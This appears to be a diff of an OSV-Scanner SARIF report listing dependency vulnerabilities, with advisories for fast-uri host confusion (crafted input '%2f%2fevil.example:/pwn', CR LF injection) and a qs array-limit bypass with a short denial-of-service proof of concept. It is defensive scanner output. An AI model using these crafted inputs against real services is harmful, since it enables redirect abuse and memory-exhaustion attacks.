+                "GHSA-jqff-g426-hqxp"
+              ],
+              "fullDescription": {
+                "markdown": "### Impact\n\n`fast-uri` decodes percent-encoded characters in the scheme component with the legacy global `unescape()` and serializes the result back as raw characters, without re-escaping it or validating it as a scheme. A scheme that decodes to characters outside the RFC 3986 scheme grammar can therefore introduce structure the original input did not contain.\n\nFor example, `%2f%2fevil.example:/pwn` parses with no authority (`parse().host` is `undefined`), but `resolve()` and `normalize()` return `//evil.example:/pwn`, which reparses with host `evil.example`. The `%uXXXX` form (`%u002f%u002fevil.example:/pwn`) produces the same result, and a scheme containing `%0d%0a` reaches the output as a raw CR LF.\n\nApplications that normalize or resolve untrusted URLs before a redirect check, host allowlist, or outbound request decision, especially ones that treat a missing authority as same-origin, can be steered to an attacker-chosen authority, and a normalized URI placed in a response header can carry an injected CR LF.\n\n### Patches\n\nUpgrade to `fast-uri` \u003e= 4.1.3, or \u003e= 3.1.6 in the v3.x release line, or \u003e= 2.4.5 in the v2.x release line.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+                "text": "### Impact\n\n`fast-uri` decodes percent-encoded characters in the scheme component with the legacy global `unescape()` and serializes the result back as raw characters, without re-escaping it or validating it as a scheme. A scheme that decodes to characters outside the RFC 3986 scheme grammar can therefore introduce structure the original input did not contain.\n\nFor example, `%2f%2fevil.example:/pwn` parses with no authority (`parse().host` is `undefined`), but `resolve()` and `normalize()` return `//evil.example:/pwn`, which reparses with host `evil.example`. The `%uXXXX` form (`%u002f%u002fevil.example:/pwn`) produces the same result, and a scheme containing `%0d%0a` reaches the output as a raw CR LF.\n\nApplications that normalize or resolve untrusted URLs before a redirect check, host allowlist, or outbound request decision, especially ones that treat a missing authority as same-origin, can be steered to an attacker-chosen authority, and a normalized URI placed in a response header can carry an injected CR LF.\n\n### Patches\n\nUpgrade to `fast-uri` \u003e= 4.1.3, or \u003e= 3.1.6 in the v3.x release line, or \u003e= 2.4.5 in the v2.x release line.\n\n### Workarounds\n\nNone. Upgrade to the patched version."
+              },
+              "help": {
+                "markdown": "**Your dependency is vulnerable to [CVE-2026-76172](https://osv.dev/CVE-2026-76172)**.\n\n## [GHSA-jqff-g426-hqxp](https://osv.dev/GHSA-jqff-g426-hqxp)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `fast-uri` decodes percent-encoded characters in the scheme component with the legacy global `unescape()` and serializes the result back as raw characters, without re-escaping it or validating it as a scheme. A scheme that decodes to characters outside the RFC 3986 scheme grammar can therefore introduce structure the original input did not contain.\n\u003e \n\u003e For example, `%2f%2fevil.example:/pwn` parses with no authority (`parse().host` is `undefined`), but `resolve()` and `normalize()` return `//evil.example:/pwn`, which reparses with host `evil.example`. The `%uXXXX` form (`%u002f%u002fevil.example:/pwn`) produces the same result, and a scheme containing `%0d%0a` reaches the output as a raw CR LF.\n\u003e \n\u003e Applications that normalize or resolve untrusted URLs before a redirect check, host allowlist, or outbound request decision, especially ones that treat a missing authority as same-origin, can be steered to an attacker-chosen authority, and a normalized URI placed in a response header can carry an injected CR LF.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Upgrade to `fast-uri` \u003e= 4.1.3, or \u003e= 3.1.6 in the v3.x release line, or \u003e= 2.4.5 in the v2.x release line.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e None. Upgrade to the patched version.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | fast-uri | 3.1.5 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | fast-uri | 3.1.5 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-jqff-g426-hqxp | fast-uri | 2.4.5, 3.1.6, 4.1.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-76172\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-76172\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2026-76172](https://osv.dev/CVE-2026-76172)**.\n\n## [GHSA-jqff-g426-hqxp](https://osv.dev/GHSA-jqff-g426-hqxp)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Impact\n\u003e \n\u003e `fast-uri` decodes percent-encoded characters in the scheme component with the legacy global `unescape()` and serializes the result back as raw characters, without re-escaping it or validating it as a scheme. A scheme that decodes to characters outside the RFC 3986 scheme grammar can therefore introduce structure the original input did not contain.\n\u003e \n\u003e For example, `%2f%2fevil.example:/pwn` parses with no authority (`parse().host` is `undefined`), but `resolve()` and `normalize()` return `//evil.example:/pwn`, which reparses with host `evil.example`. The `%uXXXX` form (`%u002f%u002fevil.example:/pwn`) produces the same result, and a scheme containing `%0d%0a` reaches the output as a raw CR LF.\n\u003e \n\u003e Applications that normalize or resolve untrusted URLs before a redirect check, host allowlist, or outbound request decision, especially ones that treat a missing authority as same-origin, can be steered to an attacker-chosen authority, and a normalized URI placed in a response header can carry an injected CR LF.\n\u003e \n\u003e ### Patches\n\u003e \n\u003e Upgrade to `fast-uri` \u003e= 4.1.3, or \u003e= 3.1.6 in the v3.x release line, or \u003e= 2.4.5 in the v2.x release line.\n\u003e \n\u003e ### Workarounds\n\u003e \n\u003e None. Upgrade to the patched version.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | fast-uri | 3.1.5 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | fast-uri | 3.1.5 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-jqff-g426-hqxp | fast-uri | 2.4.5, 3.1.6, 4.1.3 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-76172\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-76172\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+              },
+              "id": "CVE-2026-76172",
+              "name": "CVE-2026-76172",
+              "properties": {
+                "security-severity": "7.5"
+              },
+              "relationships": [],
+              "shortDescription": {
+                "markdown": "CVE-2026-76172: fast-uri vulnerable to host confusion via percent-encoded scheme normalization",
+                "text": "CVE-2026-76172: fast-uri vulnerable to host confusion via percent-encoded scheme normalization"
               }
             },
             {
@@ -8513,6 +9065,30 @@
               "shortDescription": {
                 "markdown": "CVE-2026-48818: Starlette: SSRF and NTLM credential theft via UNC paths in StaticFiles on Windows",
                 "text": "CVE-2026-48818: Starlette: SSRF and NTLM credential theft via UNC paths in StaticFiles on Windows"
+              }
+            },
+            {
+              "deprecatedIds": [
+                "CVE-2026-82562",
+                "GHSA-x5fp-wj9c-mxmx"
+              ],
+              "fullDescription": {
+                "markdown": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.",
+                "text": "### Summary\n\n`qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\nAffected version tested:\n\n```text\nqs v6.15.3\ncommit 18d085e919dae70c8f1b200ab99323058edab2c2\n```\n\n### Details\n\n`parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\n### PoC\n\n```js\nconst qs = require('qs')\nconst options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\nconst result = qs.parse('a[]=1,2,3,4', options)\nconsole.log(result.a[0].length) // 4; expected RangeError\n\nconst big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\nconsole.log(big.a[0].length) // 1000001\n```\n\nOn `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\n### Impact\n\nAn attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped."
+              },
+              "help": {
+                "markdown": "**Your dependency is vulnerable to [CVE-2026-82562](https://osv.dev/CVE-2026-82562)**.\n\n## [GHSA-x5fp-wj9c-mxmx](https://osv.dev/GHSA-x5fp-wj9c-mxmx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\u003e \n\u003e Affected version tested:\n\u003e \n\u003e ```text\n\u003e qs v6.15.3\n\u003e commit 18d085e919dae70c8f1b200ab99323058edab2c2\n\u003e ```\n\u003e \n\u003e ### Details\n\u003e \n\u003e `parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\u003e \n\u003e ### PoC\n\u003e \n\u003e ```js\n\u003e const qs = require('qs')\n\u003e const options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\u003e \n\u003e const result = qs.parse('a[]=1,2,3,4', options)\n\u003e console.log(result.a[0].length) // 4; expected RangeError\n\u003e \n\u003e const big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\n\u003e console.log(big.a[0].length) // 1000001\n\u003e ```\n\u003e \n\u003e On `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | qs | 6.15.3 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | qs | 6.15.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-x5fp-wj9c-mxmx | qs | 6.16.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-82562\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-82562\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
+                "text": "**Your dependency is vulnerable to [CVE-2026-82562](https://osv.dev/CVE-2026-82562)**.\n\n## [GHSA-x5fp-wj9c-mxmx](https://osv.dev/GHSA-x5fp-wj9c-mxmx)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e \n\u003e `qs` `v6.15.3` allows bracket-key input to bypass `arrayLimit` and `throwOnLimitExceeded` when `comma: true`. The input `a[]=1,2,3,4` succeeds with `arrayLimit: 3`, while the equivalent plain-key input is rejected.\n\u003e \n\u003e Affected version tested:\n\u003e \n\u003e ```text\n\u003e qs v6.15.3\n\u003e commit 18d085e919dae70c8f1b200ab99323058edab2c2\n\u003e ```\n\u003e \n\u003e ### Details\n\u003e \n\u003e `parseArrayValue()` enforces the comma limit only for flat values. The `a[]` form is marked non-flat, so its comma-separated value is wrapped after parsing and the inner array is not checked. A single parameter can therefore materialize arbitrarily large arrays.\n\u003e \n\u003e ### PoC\n\u003e \n\u003e ```js\n\u003e const qs = require('qs')\n\u003e const options = { comma: true, arrayLimit: 3, throwOnLimitExceeded: true }\n\u003e \n\u003e const result = qs.parse('a[]=1,2,3,4', options)\n\u003e console.log(result.a[0].length) // 4; expected RangeError\n\u003e \n\u003e const big = qs.parse('a[]=' + '1,'.repeat(1000000) + '1', { comma: true, arrayLimit: 20 })\n\u003e console.log(big.a[0].length) // 1000001\n\u003e ```\n\u003e \n\u003e On `v6.15.3`, the first input parses successfully and the second creates an array with 1,000,001 elements. The equivalent `a=1,2,3,4` input throws `RangeError` as expected.\n\u003e \n\u003e ### Impact\n\u003e \n\u003e An attacker who can supply a query string or form body can bypass configured array limits and force excessive memory allocation, causing denial of service. The limit must be applied after comma splitting and before the resulting array is wrapped.\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/pnpm-lock.yaml | qs | 6.15.3 |\n| lockfile:/home/runner/work/empathy/empathy/pnpm-lock.yaml | qs | 6.15.3 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-x5fp-wj9c-mxmx | qs | 6.16.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-82562\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n`/home/runner/work/empathy/empathy/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-82562\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
+              },
+              "id": "CVE-2026-82562",
+              "name": "CVE-2026-82562",
+              "properties": {
+                "security-severity": "6.3"
+              },
+              "relationships": [],
+              "shortDescription": {
+                "markdown": "CVE-2026-82562: qs array-limit bypass via bracket-key comma parsing",
+                "text": "CVE-2026-82562: qs array-limit bypass via bracket-key comma parsing"
               }
             },
             {
